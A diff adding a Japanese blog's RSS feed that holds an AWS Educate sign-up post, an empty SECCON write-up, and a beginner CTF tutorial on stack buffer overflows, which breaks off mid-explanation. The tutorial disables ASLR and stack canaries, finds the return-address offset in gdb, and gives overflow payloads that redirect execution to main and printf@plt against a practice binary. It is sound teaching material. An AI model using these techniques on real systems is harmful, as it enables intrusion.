@@ -1,0 +1,981 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on vintersnow&#39;s page</title>
+    <link>http://vintersnow.github.io/post/index.xml</link>
+    <description>Recent content in Posts on vintersnow&#39;s page</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>ja-JP</language>
+    <lastBuildDate>Fri, 20 Jan 2017 18:41:07 +0900</lastBuildDate>
+    <atom:link href="http://vintersnow.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>AWS educationに登録した</title>
+      <link>http://vintersnow.github.io/post/aws_education/</link>
+      <pubDate>Fri, 20 Jan 2017 18:41:07 +0900</pubDate>
+      
+      <guid>http://vintersnow.github.io/post/aws_education/</guid>
+      <description>
+
+&lt;p&gt;&lt;a href=&#34;https://education.github.com/pack&#34;&gt; 学生用のディスカウントがこんなにあるとは知らなかった。 &lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;今回、AWS EducationというAmazon Web Serviceの学生特典に登録してみた。&lt;/p&gt;
+
+&lt;h1 id=&#34;aws-education&#34;&gt;AWS Education&lt;/h1&gt;
+
+&lt;h2 id=&#34;出来ること&#34;&gt;出来ること&lt;/h2&gt;
+
+&lt;figure&gt;
+  &lt;img src=&#34;http://vintersnow.github.io/static/images/post/aws_education.png&#34; alt=&#34;AWS educationに登録した static/images/post/aws_education.png&#34;&gt;
+  
+&lt;/figure&gt;
+
+
+&lt;p&gt;一番重要なのは100(40)ドルのクレジットだろう。
+加盟校の一覧は&lt;a href=&#34;https://s3.amazonaws.com/awseducate-list/AWS_Educate_Institutions.pdf&#34;&gt;ここ&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;登録&#34;&gt;登録&lt;/h2&gt;
+
+&lt;h3 id=&#34;事前に必要なもの&#34;&gt;事前に必要なもの&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;学校のメールアドレス&lt;/li&gt;
+&lt;li&gt;AWSアカウント&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://aws.amazon.com/jp/education/awseducate/&#34;&gt;https://aws.amazon.com/jp/education/awseducate/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;上記のリンクから「AWS Educateに今すぐ参加する」をクリック&lt;/p&gt;
+
+&lt;p&gt;あとは流れに沿って埋めていく。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://aws.amazon.com/jp/how-to-find-accountid/&#34;&gt;途中AWSアカウント IDが必要となるがこれはAWSのコンソールで確認可能。&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;登録が成功したらこんなメールが来る。&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&#34;http://vintersnow.github.io/static/images/post/aws_education_mail.png&#34; alt=&#34;AWS educationに登録した static/images/post/aws_education_mail.png&#34;&gt;
+  
+&lt;/figure&gt;
+
+
+&lt;p&gt;Credit Codeというのが書いてあるので、AWSコンソールから&lt;code&gt;アカウント&lt;/code&gt;-&amp;gt;&lt;code&gt;クレジット&lt;/code&gt;に進みプロモーションコードを入力すればクレジットがもらえる。&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&#34;http://vintersnow.github.io/static/images/post/aws_education_credit.png&#34; alt=&#34;AWS educationに登録した static/images/post/aws_education_credit.png&#34;&gt;
+  
+&lt;/figure&gt;
+
+
+&lt;p&gt;使い過ぎて料金を請求されないように注意しよう。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Catch the SECCON2016 if You Can</title>
+      <link>http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/</link>
+      <pubDate>Mon, 12 Dec 2016 19:34:37 +0900</pubDate>
+      
+      <guid>http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/</guid>
+      <description>
+
+&lt;h1 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h1&gt;
+
+&lt;p&gt;この記事は&lt;a href=&#34;http://qiita.com/advent-calendar/2016/eeic2&#34;&gt;eeic Adevent Calendar 2016 その２&lt;/a&gt;の１１日目です。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;第一部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can/&#34;&gt;CTFについて&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;第二部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/&#34;&gt;はじめてのバイナリ解析&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;第三部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/&#34;&gt;SECCON2016 write up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;この記事は第三部です。（長くなったので分割しました。）&lt;/p&gt;
+
+&lt;h1 id=&#34;seccon2016-write-up&#34;&gt;SECCON2016 write up&lt;/h1&gt;
+
+&lt;h1&gt;一問も解けなかったのでなにも書けませ〜ん&lt;/h1&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Catch the Binary if You Can</title>
+      <link>http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/</link>
+      <pubDate>Mon, 12 Dec 2016 14:34:37 +0900</pubDate>
+      
+      <guid>http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/</guid>
+      <description>
+
+&lt;h1 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h1&gt;
+
+&lt;p&gt;この記事は&lt;a href=&#34;http://qiita.com/advent-calendar/2016/eeic2&#34;&gt;eeic Adevent Calendar 2016 その２&lt;/a&gt;の１１日目です。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;第一部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can/&#34;&gt;CTFについて&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;第二部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_binary/&#34;&gt;はじめてのバイナリ解析&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;第三部: &lt;a href=&#34;http://vintersnow.github.io/post/catch_the_flag_if_you_can_seccon/&#34;&gt;SECCON2016 write up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;この記事は第二部です。（長くなったので分割しました。）&lt;/p&gt;
+
+&lt;h1 id=&#34;binary&#34;&gt;はじめてのバイナリ解析&lt;/h1&gt;
+
+&lt;p&gt;CTFの花形はバイナリ解析です。
+&lt;a href=&#34;https://www.amazon.co.jp/dp/4839956480/ref=sr_1_1?ie=UTF8&amp;amp;qid=1481523754&amp;amp;sr=8-1&#34;&gt;セキュリティコンテストチャレンジブック&lt;/a&gt;で少し勉強したので、バイナリ解析の基礎を紹介したいと思います。&lt;/p&gt;
+
+&lt;h2 id=&#34;バイナリとは&#34;&gt;バイナリとは&lt;/h2&gt;
+
+&lt;p&gt;バイナリとは一般的に「コンピュータが扱えるように2進数で表されたデータ」です。なので画像ファイルなどもバイナリなのですが、バイナリ解析で扱うバイナリはコンピュータが実行可能なプログラムのファイルのことを指します。&lt;/p&gt;
+
+&lt;h2 id=&#34;表層解析と動的解析と静的解析&#34;&gt;表層解析と動的解析と静的解析&lt;/h2&gt;
+
+&lt;p&gt;例えばCのプログラムをgccでコンパイルした時のa.outをそのまま渡されてなにが「分かることを豊かに述べよk」なんて言われたらどうしますか？&lt;/p&gt;
+
+&lt;h3 id=&#34;表層解析&#34;&gt;表層解析&lt;/h3&gt;
+
+&lt;p&gt;まじファイルを実行する前に分かることを調べましょう。そのために&lt;code&gt;file&lt;/code&gt;と&lt;code&gt;strings&lt;/code&gt;というコマンドを使います。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ file a.out
+a.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, 
+BuildID[sha1]=643b4dc3720a4a5eefe53a385df75358698e2d65, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;file&lt;/code&gt;コマンドでどのようなファイルかがわかります。
+今回の場合、&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;ELF 32bit - 32bit Linuxの実行ファイル&lt;/li&gt;
+&lt;li&gt;Intel 80386 - intel i386アーキテクチャ&lt;/li&gt;
+&lt;li&gt;dynamically linked - 動的リンクを採用している&lt;/li&gt;
+&lt;li&gt;not stripped - シンボル情報が残っている&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;ということがわかります。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;strings&lt;/code&gt;コマンドは実行ファイル中に存在する連続したASCII文字列を抜き出してくれます。
+リンクするライブラリ名やプログラム中の文字列リテラルなどが分かります。&lt;/p&gt;
+
+&lt;h3 id=&#34;実行する前に&#34;&gt;実行する前に&lt;/h3&gt;
+
+&lt;p&gt;OSにはRELROやカナリアやASLRといった様々なセキュリティ機能があります。&lt;br /&gt;
+カナリアはスタック上に値を挿入することでバッファオーバーフローを感知する仕組みです。&lt;br /&gt;
+ASRLはスタックやヒープのアドレスの一部をランダム化することで攻撃者がアドレスを推測するのを困難にします。&lt;br /&gt;
+問題を簡単にするためにカナリアとASRLは無効化しておきます。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sudo sysctl -w kernel.randomize_va_space=0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;カナリアを無効にするにはコンパイル時に&lt;code&gt;-fno-stack-protector&lt;/code&gt;をつけます。&lt;/p&gt;
+
+&lt;h3 id=&#34;動的解析&#34;&gt;動的解析&lt;/h3&gt;
+
+&lt;p&gt;実行可能な環境が分かったところで実際に動かいして見ましょう&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ ./a.out
+buffer: 0x56557020
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;bufferのアドレスが出力されて、入力待ちになりました。適当な文字列を打つとそのまま終了します。&lt;/p&gt;
+
+&lt;p&gt;Linuxにはトレーサーというものがあり、実行ファイルがどのようなリソースを使っているのか調べることが出来ます。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;strace - システムコールを監視する。&lt;/li&gt;
+&lt;li&gt;ltrace - 共有ライブラリの呼び出しを監視する。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;ltraceをしてみましょう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ ltrace ./a.out
+__libc_start_main(0x565a3626, 1, 0xff89bec4, 0x565a3680 &amp;lt;unfinished ...&amp;gt;
+printf(&amp;quot;buffer: 0x%x\n&amp;quot;, 0x565a5024buffer: 0x565a5024
+)                           = 19
+fgets(hoge
+&amp;quot;hoge\n&amp;quot;, 128, 0xf77925a0)                               = 0xff89bdf6
++++ exited (status 0) +++
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;ldquo;buffer: 0x&amp;hellip;&amp;ldquo;を出力するにprintfを、入力にはfgetsを使っていることが分かりました。&lt;/p&gt;
+
+&lt;p&gt;分かる情報は少ないですが、straceやltraceや実際に実行することでプログラムの大まかな流れを把握することが出来ます。&lt;/p&gt;
+
+&lt;p&gt;より詳細に見るために、gdbなどのデバッガで見ていきます。
+gdbでのバイナリ解析をより便利にするために&lt;a href=&#34;https://github.com/longld/peda&#34;&gt;gdb-peda&lt;/a&gt;というを入れています。
+gdbで逐次実行してもいいのですが、これみよがしににbufferのアドレスが出力されているので、それを見てみましょう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ gdb -q a.out
+Reading symbols from a.out...(no debugging symbols found)...done.
+gdb-peda$ b main
+Breakpoint 1 at 0x635
+gdb-peda$ r
+Starting program: /home/vagrant/projects/ctf/challenge_book/test/a.out
+ [----------------------------------registers-----------------------------------]
+EAX: 0xf7faedbc --&amp;gt; 0xffffc62c --&amp;gt; 0xffffc826 (&amp;quot;USER=vagrant&amp;quot;)
+EBX: 0x0
+ECX: 0xffffc590 --&amp;gt; 0x1
+EDX: 0xffffc5b4 --&amp;gt; 0x0
+ESI: 0x1
+EDI: 0xf7fad000 --&amp;gt; 0x1b2db0
+EBP: 0xffffc578 --&amp;gt; 0x0
+ESP: 0xffffc570 --&amp;gt; 0xffffc590 --&amp;gt; 0x1
+EIP: 0x56555635 (&amp;lt;main+15&amp;gt;:     call   0x5655566e &amp;lt;__x86.get_pc_thunk.ax&amp;gt;)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x56555631 &amp;lt;main+11&amp;gt;:        mov    ebp,esp
+   0x56555633 &amp;lt;main+13&amp;gt;:        push   ebx
+   0x56555634 &amp;lt;main+14&amp;gt;:        push   ecx
+=&amp;gt; 0x56555635 &amp;lt;main+15&amp;gt;:        call   0x5655566e &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+   0x5655563a &amp;lt;main+20&amp;gt;:        add    eax,0x19c6
+   0x5655563f &amp;lt;main+25&amp;gt;:        sub    esp,0x8
+   0x56555642 &amp;lt;main+28&amp;gt;:        lea    edx,[eax+0x20]
+   0x56555648 &amp;lt;main+34&amp;gt;:        push   edx
+Guessed arguments:
+arg[0]: 0xffffc590 --&amp;gt; 0x1
+arg[1]: 0x0
+arg[2]: 0x0
+arg[3]: 0xf7e12276 (&amp;lt;__libc_start_main+246&amp;gt;:    add    esp,0x10)
+[------------------------------------stack-------------------------------------]
+0000| 0xffffc570 --&amp;gt; 0xffffc590 --&amp;gt; 0x1
+0004| 0xffffc574 --&amp;gt; 0x0
+0008| 0xffffc578 --&amp;gt; 0x0
+0012| 0xffffc57c --&amp;gt; 0xf7e12276 (&amp;lt;__libc_start_main+246&amp;gt;:       add    esp,0x10)
+0016| 0xffffc580 --&amp;gt; 0x1
+0020| 0xffffc584 --&amp;gt; 0xf7fad000 --&amp;gt; 0x1b2db0
+0024| 0xffffc588 --&amp;gt; 0x0
+0028| 0xffffc58c --&amp;gt; 0xf7e12276 (&amp;lt;__libc_start_main+246&amp;gt;:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x56555635 in main ()
+gdb-peda$ x/1bs  0x56557020
+0x56557020 &amp;lt;buffer&amp;gt;:    &amp;quot;flag:first_pwn&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;flagが見つかりましたね！&lt;/p&gt;
+
+&lt;p&gt;さてこれだけだと簡単すぎるので、もう少し難しくしましょう。&lt;/p&gt;
+
+&lt;p&gt;実はこの実行ファイルはサンプルで、本物の実行ファイルがサーバーにあって、telnet経由で標準入力のやりとりだけできるとします。
+標準入力だけでflagを表示させないといけないわけです。&lt;/p&gt;
+
+&lt;p&gt;幸い、flagがbufferにあることが分かっています。さらに入力にfgetsを使っていますが、fgetsはバッファオーバーフロー脆弱性があることが分かっています。&lt;/p&gt;
+
+&lt;p&gt;バッファオーバーフロー脆弱性をつくためにもう少し詳しく調べてみましょう。&lt;/p&gt;
+
+&lt;h3 id=&#34;バッファオーバーフロー&#34;&gt;バッファオーバーフロー&lt;/h3&gt;
+
+&lt;p&gt;バッファオーバーフローとは一般的にプログラムが決められたメモリ以外を塗りつぶししてしまい、セグメンテーション違反などが起きることです。&lt;/p&gt;
+
+&lt;p&gt;実際に試して見ましょう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ ./a.out
+buffer: 0x56557020
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+zsh: segmentation fault  ./a.out
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;セグフォってますね。セグフォはgdbで調べることが出来ます。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ gdb -q a.out
+Reading symbols from a.out...(no debugging symbols found)...done.
+gdb-peda$ r
+Starting program: /home/vagrant/projects/ctf/challenge_book/test/a.out
+buffer: 0x56557020
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+ [----------------------------------registers-----------------------------------]
+EAX: 0xffffc556 (&#39;A&#39; &amp;lt;repeats 68 times&amp;gt;, &amp;quot;\n&amp;quot;)
+EBX: 0x41414141 (&#39;AAAA&#39;)
+ECX: 0xf7fae87c --&amp;gt; 0x0
+EDX: 0xffffc556 (&#39;A&#39; &amp;lt;repeats 68 times&amp;gt;, &amp;quot;\n&amp;quot;)
+ESI: 0x1
+EDI: 0xf7fad000 --&amp;gt; 0x1b2db0
+EBP: 0x41414141 (&#39;AAAA&#39;)
+ESP: 0xffffc570 (&#39;A&#39; &amp;lt;repeats 42 times&amp;gt;, &amp;quot;\n&amp;quot;)
+EIP: 0x41414141 (&#39;AAAA&#39;)
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffc570 (&#39;A&#39; &amp;lt;repeats 42 times&amp;gt;, &amp;quot;\n&amp;quot;)
+0004| 0xffffc574 (&#39;A&#39; &amp;lt;repeats 38 times&amp;gt;, &amp;quot;\n&amp;quot;)
+0008| 0xffffc578 (&#39;A&#39; &amp;lt;repeats 34 times&amp;gt;, &amp;quot;\n&amp;quot;)
+0012| 0xffffc57c (&#39;A&#39; &amp;lt;repeats 30 times&amp;gt;, &amp;quot;\n&amp;quot;)
+0016| 0xffffc580 (&#39;A&#39; &amp;lt;repeats 26 times&amp;gt;, &amp;quot;\n&amp;quot;)
+0020| 0xffffc584 (&#39;A&#39; &amp;lt;repeats 22 times&amp;gt;, &amp;quot;\n&amp;quot;)
+0024| 0xffffc588 (&#39;A&#39; &amp;lt;repeats 18 times&amp;gt;, &amp;quot;\n&amp;quot;)
+0028| 0xffffc58c (&#39;A&#39; &amp;lt;repeats 14 times&amp;gt;, &amp;quot;\n&amp;quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;レジスタをみてみるとEIPがAAAAで塗りつぶされています。このEIPというレジスタは次に実行するアセンブリ命令のアドレス(PC)を指しています。これが0x41414141(&amp;ldquo;AAAA&amp;rdquo;)となっているので&lt;code&gt;Invalid $PC&lt;/code&gt;となってしまいセグフォてます。&lt;br /&gt;
+EIPの書き換えが可能というのとても重大な脆弱性でこれをつくことでプログラムを好きな実行命令を実行させることが出来たりします。（詳しく知りたい人はret2libcで調べましょう。）&lt;/p&gt;
+
+&lt;h3 id=&#34;静的解析&#34;&gt;静的解析&lt;/h3&gt;
+
+&lt;p&gt;静的解析とはプログラムの実行ファイルを逆アセンブルして読んでいくことです。この手法は時間がかかりますが、一応プログラムの全てを把握することが出来ます。&lt;/p&gt;
+
+&lt;p&gt;ただそのためにはアセンプリを読める必要があります。&lt;br /&gt;
+まあみなさんeeicの人読めるとは思いますが。&lt;/p&gt;
+
+&lt;p&gt;冗談です。普通は読めません。&lt;/p&gt;
+
+&lt;p&gt;詳しく説明するると長くなる上自分もほとんど詳しくないので、（ボロが出ないよう）必要な時にちょこちょこ説明をはさむようにします。&lt;/p&gt;
+
+&lt;p&gt;とりあえず逆アセンブルしてみましょう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ objdump -d -M intel --no a.out &amp;gt; asm.s
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;main関数のところをみるとこんな感じになっています。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;00000626 &amp;lt;main&amp;gt;:
+ 626: lea    ecx,[esp+0x4]
+ 62a: and    esp,0xfffffff0
+ 62d: push   DWORD PTR [ecx-0x4]
+ 630: push   ebp
+ 631: mov    ebp,esp
+ 633: push   ebx
+ 634: push   ecx
+ 635: call   66e &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+ 63a: add    eax,0x19c6
+ 63f: sub    esp,0x8
+ 642: lea    edx,[eax+0x20]
+ 648: push   edx
+ 649: lea    edx,[eax-0x1900]
+ 64f: push   edx
+ 650: mov    ebx,eax
+ 652: call   440 &amp;lt;printf@plt&amp;gt;
+ 657: add    esp,0x10
+ 65a: call   5f0 &amp;lt;input&amp;gt;
+ 65f: mov    eax,0x0
+ 664: lea    esp,[ebp-0x8]
+ 667: pop    ecx
+ 668: pop    ebx
+ 669: pop    ebp
+ 66a: lea    esp,[ecx-0x4]
+ 66d: ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;main関数では0x00000652でprintfを、0x0000065aでinputという関数を呼び出していることが分かります。&lt;/p&gt;
+
+&lt;p&gt;とりあえずmain関数のアドレスがわかったので、EIPをmain関数に設定してみましょう。&lt;/p&gt;
+
+&lt;p&gt;まずEIPが入力のどの部分で上書きされるか調べます。
+gdb-pedaにはpattcとpattoという便利なコマンドがあります。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ gdb -q a.out
+Reading symbols from a.out...(no debugging symbols found)...done.
+gdb-peda$ pattc 50
+&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#39;
+gdb-peda$ r
+Starting program: /home/vagrant/projects/ctf/challenge_book/test/a.out
+buffer: 0x56557020
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+
+Program received signal SIGSEGV, Segmentation fault.
+ [----------------------------------registers-----------------------------------]
+EAX: 0xffffc556 (&amp;quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n&amp;quot;)
+EBX: 0x41416e41 (&#39;AnAA&#39;)
+ECX: 0xf7fae87c --&amp;gt; 0x0
+EDX: 0xffffc556 (&amp;quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n&amp;quot;)
+ESI: 0x1
+EDI: 0xf7fad000 --&amp;gt; 0x1b2db0
+EBP: 0x2d414143 (&#39;CAA-&#39;)
+ESP: 0xffffc570 (&amp;quot;ADAA;AA)AAEAAaAA0AAFAAbA\n&amp;quot;)
+EIP: 0x41284141 (&#39;AA(A&#39;)
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41284141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffc570 (&amp;quot;ADAA;AA)AAEAAaAA0AAFAAbA\n&amp;quot;)
+0004| 0xffffc574 (&amp;quot;;AA)AAEAAaAA0AAFAAbA\n&amp;quot;)
+0008| 0xffffc578 (&amp;quot;AAEAAaAA0AAFAAbA\n&amp;quot;)
+0012| 0xffffc57c (&amp;quot;AaAA0AAFAAbA\n&amp;quot;)
+0016| 0xffffc580 (&amp;quot;0AAFAAbA\n&amp;quot;)
+0020| 0xffffc584 (&amp;quot;AAbA\n&amp;quot;)
+0024| 0xffffc588 --&amp;gt; 0xa (&#39;\n&#39;)
+0028| 0xffffc58c --&amp;gt; 0xf7e12276 (&amp;lt;__libc_start_main+246&amp;gt;:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41284141 in ?? ()
+gdb-peda$ patto AA(A
+AA(A found at offset: 22
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;pattcで生成した文字列を入力して、EIPに入力された文字列が何バイト目に現れるかpattoで調べます。
+今回の場合22とわかりました。&lt;br /&gt;
+なのでfgetsのリターンアドレスをmain関数(0x56555626)の先頭にするには以下のような入力になります。
+intelアーキテクチャはリトルエンディアンであること、objdumpで分かったアドレスにオフセットを加えることに注意してください。&lt;br /&gt;
+bufferのアドレスが2回出てきたら成功です。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ echo -e &#39;AAAAAAAAAAAAAAAAAAAAAA\x26\x56\x55\x56&#39; | ./a.out
+buffer: 0x56557020
+buffer: 0x56557020
+zsh: done                echo -e &#39;AAAAAAAAAAAAAAAAAAAAAA\x26\x56\x55\x56&#39; |
+zsh: segmentation fault  ./a.out
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;return-to-plt&#34;&gt;Return to PLT&lt;/h3&gt;
+
+&lt;p&gt;call命令はjump命令と同じく次の命令を指定されたアドレスに飛ばします。この時ret命令で戻ってこれるようにリターンアドレスをスタックにpushする点が違います。
+この時ret命令ではスタックの一番先をeipにpopします。前の攻撃でmain関数が2回実行されたのは、バッファオーバーフローでリターンアドレスが上書きされてしまい、それがret命令でeipにセットされたからでした。&lt;/p&gt;
+
+&lt;p&gt;flagを得るにはbufferを出力したいわけです。そこでmain関数を呼び出すのではなく、printf関数をbufferを引数に呼び出してみましょう。&lt;/p&gt;
+
+&lt;p&gt;アセンブリでの引数はスタック上にあります。
+例えば2個引数をとる関数を呼び出すにはcallをする前に必要な引数をスタック上にpushしておきます。
+なのでバッファオーバーフローでリターンアドレスだけではなく、引数の部分も上書きしてしまえば、あたかもその引数で本当にその関数を呼び出したかのように実行できます。&lt;/p&gt;
+
+&lt;p&gt;オーバーフロー後のスタックは以下の表にのなります。&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;address&lt;/th&gt;
+&lt;th&gt;value&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;0x00000000&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;&amp;hellip;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;リターンアドレス&lt;/td&gt;
+&lt;td&gt;printfのアドレス&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;printf呼び出し後のアドレス&lt;/td&gt;
+&lt;td&gt;ダミー&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;引数1&lt;/td&gt;
+&lt;td&gt;bufferのアドレス&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;&amp;hellip;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;0xFFFFFFFF&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;bufferのアドレスは実行した時に分かっていますが、readelfを使って知ることも出来ます。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ readelf -s a.out| grep buffer
+    58: 00002020    15 OBJECT  GLOBAL DEFAULT   25 buffer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;なので、bufferのアドレスは0x56557020となります。&lt;/p&gt;
+
+&lt;p&gt;次にprintfのアドレスを調べましょう。&lt;/p&gt;
+
+&lt;p&gt;printfは共有ライブラリの関数なので実行ファイルには含まれず動的リンクされます。動的リンクされた関数を呼び出すためにPLTと呼ばれるコード片が実行ファイルには含まれます。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ objdump -d -M intel -j .plt --no a.out
+
+a.out:     ファイル形式 elf32-i386
+
+
+セクション .plt の逆アセンブル:
+
+00000430 &amp;lt;printf@plt-0x10&amp;gt;:
+ 430:   push   DWORD PTR [ebx+0x4]
+ 436:   jmp    DWORD PTR [ebx+0x8]
+ 43c:   add    BYTE PTR [eax],al
+        ...
+
+00000440 &amp;lt;printf@plt&amp;gt;:
+ 440:   jmp    DWORD PTR [ebx+0xc]
+ 446:   push   0x0
+ 44b:   jmp    430 &amp;lt;_init+0x30&amp;gt;
+
+00000450 &amp;lt;fgets@plt&amp;gt;:
+ 450:   jmp    DWORD PTR [ebx+0x10]
+ 456:   push   0x8
+ 45b:   jmp    430 &amp;lt;_init+0x30&amp;gt;
+
+00000460 &amp;lt;__libc_start_main@plt&amp;gt;:
+ 460:   jmp    DWORD PTR [ebx+0x14]
+ 466:   push   0x10
+ 46b:   jmp    430 &amp;lt;_init+0x30&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;printfのアドレスは0x56555430になります。&lt;/p&gt;
+
+&lt;p&gt;ここでprintf@pltをみるとjump先のアドレスを$EBXレジスタから計算しています。（&lt;code&gt;DWORD PTR [ebx+0x8]&lt;/code&gt;の部分）&lt;/p&gt;
+
+&lt;p&gt;なので、$EBXレジスタも正しい値にしないといけません。
+gdbでprintfを呼び出した時の$EBXの値を見ると、0x56557000でした。
+また上書きした時のoffsetを14でした。なので入力は下記のようになります。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# $ echo -en &#39;AAAAAAAAAAAAAA\x00\x70\x55\x56SAAA\x40\x54\x55\x56BBBB\x20\x70\x55\x56&#39; | ./a.out
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;これでうまくいくprintfが実行されるはずですが、実際にやってみると表示されません。
+どうやらどっかでバッファしているらしく、printfのret時にはセグフォが起きると表示されないようです。
+なのでprintfのリターンアドレスをmain関数の先頭にして起きます。&lt;/p&gt;
+
